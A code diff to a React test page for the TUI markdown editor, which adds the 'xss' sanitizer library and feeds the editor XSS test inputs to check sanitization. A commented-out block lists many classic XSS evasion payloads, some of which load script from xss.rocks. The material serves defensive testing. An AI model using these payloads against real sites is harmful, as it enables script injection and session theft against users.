@@ -5,11 +5,10 @@ import "tui-editor/dist/tui-editor-contents.min.css";
 import Editor from "tui-editor";
 import { getLeftSpaces, getRightSpaces, separateCharsByRegex } from "./utils";
 import { size, trim, trimStart, trimEnd } from "lodash";
+import xss from "xss";
 
 // import table extension
 import "tui-editor/dist/tui-editor-extTable";
-
-var content = ["hello , hello , hello , hello , hello , hello"].join("\n");
 
 /*
 var content = [
@@ -60,6 +59,80 @@ var content = [
   ":abc:"
 ].join("\n");
 */
+
+var content = [
+  'javascript: window.alert("xss");', // 일반 텍스트 // xxx
+
+  "![image](https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png)", // <img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png" alt="image"> // xxx
+  "![image](javascript:window.alert('xss');)", // TUI Convertor 에서 변환되지 않는다. // xxx
+  "![image](window.alert('xss');)", // <img src="window.alert('xss');" alt="image"> // src 제거
+
+  '<img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png">', // <img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png" alt=""> // xxx
+  '<img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png" onload="" onerror="">',
+  '<img src="javascript: window.alert("xss");">', // TUI Convertor 에서 encode 처리 &lt;img src="javascript: window.alert("xss");"&gt; // xxx
+
+  "```js",
+  'console.log("fenced code block");', // <pre><code data-language="js" class="lang-js">console.log("fenced code block");</code></pre> => <pre><code>console.log("fenced code block");</code></pre> // data-language, class 속성 제거
+  "```",
+
+  '<pre><script>window.alert("xss");</script></pre>', // <pre><code></code></pre> // <script> 태그 제거 // xxx
+  "[link](https://nhnent.github.io/tui.editor/)", // <a href="https://nhnent.github.io/tui.editor/">link</a> 로 파싱 // xxx
+  '<span style="color:#e11d21" class="javascript: window.alert("xss");">xss</span>', // &lt;span style="color:#e11d21" class="javascript: window.alert("xss");"&gt;xss // encode 처리 // xxx
+  '<span style="color:#e11d21" class="foo">xss</span>', // <span class="colour" style="color:rgb(225, 29, 33)">xss</span></p> => <p><span>xss</span></p> // class, style 속성 제거 // ???
+  '<script>window.alert("xss");</script>', // script 태그는 TUI Convertor 단에서 제거된다. // xxx
+  `<img src="/" =_=" title="onerror='prompt(1)'">`, // TUI convertor 에서 제거 // xxx
+  `<a href="javascript:\u0061lert(1)">`, // TUI convertor 에서 제거 // xxx
+
+  `<a href="https://www.google.com">google</a>`,
+  `<a href="https://www.google.com" onerror="">google</a>`,
+  `<a href="https://www.google.com" onload="">google</a>`
+
+  /*
+  "test 입니다.",
+  "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
+  `<IMG SRC="javascript:alert('XSS');">`,
+  `<IMG SRC=javascript:alert('XSS')>`,
+  `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
+  `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`,
+  "<IMG SRC=`javascript:alert('RSnake says, 'XSS'')`>",
+  `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
+  `<IMG SRC=# onmouseover="alert('xxs')">`,
+  `<IMG SRC= onmouseover="alert('xxs')">`,
+  `<IMG onmouseover="alert('xxs')">`,
+  `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
+  `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
+  `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
+  `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
+  `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
+  `<IMG SRC="jav	ascript:alert('XSS');">`,
+  `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
+  `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
+  `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
+  `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`,
+  `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
+  `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
+  '<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>',
+  `<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`,
+  `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
+  `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
+  `<SCRIPT SRC=//xss.rocks/.j>`,
+  `<IMG SRC="javascript:alert('XSS')"`,
+  `<iframe src=http://xss.rocks/scriptlet.html <`,
+  `\";alert('XSS');//`,
+  `</script><script>alert('XSS');</script>`,
+  `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
+  `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
+  `<BODY BACKGROUND="javascript:alert('XSS')">`,
+  `<IMG DYNSRC="javascript:alert('XSS')">`,
+  `<IMG LOWSRC="javascript:alert('XSS')">`,
+  `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
+  `<IMG SRC='vbscript:msgbox("XSS")'>`,
+  `<IMG SRC="livescript:[code]">`,
+  `<svg/onload=alert('XSS')>`,
+  "Set.constructor`alert\x28document.domain\x29```",
+  `<BODY ONLOAD=alert('XSS')>`
+  */
+].join("\n");
 console.log("content :", content);
 
 class TestTUIEditor extends Component {
@@ -119,6 +192,28 @@ class TestTUIEditor extends Component {
       previewStyle: "vertical",
       height: "500px",
       initialValue: content,
+      toolbarItems: [
+        "heading",
+        "bold",
+        "italic"
+        // 'strike',
+        // 'divider',
+        // 'hr',
+        // 'quote',
+        // 'divider',
+        // 'ul',
+        // 'ol',
+        // 'task',
+        // 'indent',
+        // 'outdent',
+        // 'divider',
+        // 'table',
+        // 'image',
+        // 'link',
+        // 'divider',
+        // 'code',
+        // 'codeblock'
+      ],
       exts: [
         "scrollSync",
         "colorSyntax",
@@ -326,8 +421,80 @@ class TestTUIEditor extends Component {
       // mink.md => markdown
 
       // markdown => html
-      const html = editor.convertor.toHTML(minkMarkdown); // markdownit.render
-      console.log(`[View][3. get html. mink.md => html] : /${html}/`);
+      const html = editor.convertor.toHTML(markdown); // markdownit.render
+      console.log(`[View][3. get html. markdown => html] : //${html}//`);
+
+      // 모바일 디바이스나, pc 에서 마크다운 + 위지윅 편집기로 작성할 수 있는 컨텐츠는 아래와 같다.
+      // 일반 텍스트(normal, bold, italic, del, h2, )
+      // "![image](https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png)",
+      // "    code block",
+      // "```js",
+      // 'console.log("fenced code block");',
+      // "```",
+      // <pre><script>window.alert('xss');</script></pre>
+      // [link](https://nhnent.github.io/tui.editor/)
+      // <span style="color:#e11d21" class="javascript: window.alert('xss');">xss</span>
+
+      // 허용하고 싶은 속성들을 설정할 수도 있다. 그런데, 허용하면 공격을 어떻게 막지?
+      // style, class, data-{}, alt, title, src,
+
+      // alt, title 속성도 확인해보자. alt, title 에 javascript 가 적혀 있으면 이상 없는가? // 테스트로는 이상 없다. // xxx
+      // <img> src 에 javascript 코드가 있다면 지워지는게 맞다. 이미지 url 이라면 삭제가 안 되어야 한다. // src 에 javascript 가 있을 경우, encode 되므로 해결. // xxx
+      // <pre> 태그 안의 <script> 태그와 내용이 제거되고 있는데, 이거 안 지워져도 된다. // xxx
+      // <span> 태그의 class 에 javascript 를 썼더니, encode 처리가 되고 있네. // 모든 태그의 data-{}, class, style 속성이 현재 무조건 삭제 되는 듯. 제거하는게 맞음. // xxx
+      // a href // href 속성은 링크일 경우 안 걸러지고 있는데 'ㅅ') // xxx
+      // <script> 태그는 지워지는게 맞다.
+
+      // 어느 정도는 TUI Convertor 와 xss module 을 신뢰할 수 있다.
+      console.log(
+        "xss(html) with options :",
+        xss(html, {
+          /*
+          whiteList: {
+            a: ["href", "title", "target"]
+          },
+          */
+          // whiteList: {}, // empty, means filter out all tags
+          // stripIgnoreTag: true, // filter out all HTML not in the whilelist
+          // stripIgnoreTagBody: ["script"], // the script tag is a special case, we need to filter out its content
+          // allowCommentTag: false
+          /*
+          onTag,
+
+          onTagAttr: function(tag, name, value, isWhiteAttr) {
+            if (tag === "img" && name === "src") {
+              // Use the built-in friendlyAttrValue function to escape attribute
+              // values. It supports converting entity tags such as &lt; to printable
+              // characters such as <
+              console.log("onTagAttr :", value);
+              console.log(
+                "onTagAttr - xss.friendlyAttrValue :",
+                xss.friendlyAttrValue(value)
+              );
+            }
+            // Return nothing, means keep the default handling measure
+          },
+          onIgnoreTag: function(tag, html, options) {
+            if (tag.substr(0, 2) === "x-") {
+              // 여기서 언급된 태그의 attr 은 건드리지 않는다.
+              // do not filter its attributes
+              return html;
+            }
+          },
+          onIgnoreTagAttr: function(tag, name, value, isWhiteAttr) {
+            console.log("name :", name);
+
+            if (name.substr(0, 5) === "data-") {
+              // escape its value using built-in escapeAttrValue function
+              return name + '="' + xss.escapeAttrValue(value) + '"';
+            }
+          },
+          
+          */
+        })
+      );
+
+      return;
 
       const boldItalicRangeRegex = /(\*{3}|_{3}).*\1/;
 
